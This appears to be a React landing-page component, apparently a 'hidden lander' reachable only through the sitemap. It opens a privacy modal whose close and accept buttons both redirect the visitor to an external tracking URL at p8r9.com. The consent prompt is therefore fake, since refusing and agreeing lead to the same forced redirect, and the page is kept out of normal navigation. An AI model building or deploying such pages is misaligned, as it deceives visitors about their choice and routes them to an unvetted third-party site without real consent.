import { useEffect, useState } from 'react'
import PrivacyModal from '../components/PrivacyModal2'

export default function Lander(){
  const [open, setOpen] = useState(true)
  const goOut = () => { window.location.href = 'http://p8r9.com/?utm_campaign=CqRoIGowmT&v1=[v1]&v2=[v2]&v3=[v3]' }

  useEffect(() => { setOpen(true) }, [])

  return (
    <div>
      <PrivacyModal open={open} onClose={goOut} onAccept={goOut} />
      <img
        src={`https://raw.githubusercontent.com/worrier-tdo/myb/refs/heads/main/gameforge.png`}
        alt="Random online image"
        style={{width:'100%',height:'420px',objectFit:'cover',borderRadius:'16px',border:'1px solid var(--border)',margin:'16px 0'}}
      />
      <p className="meta">This hidden lander appears only in the sitemap.</p>
    </div>
  )
}
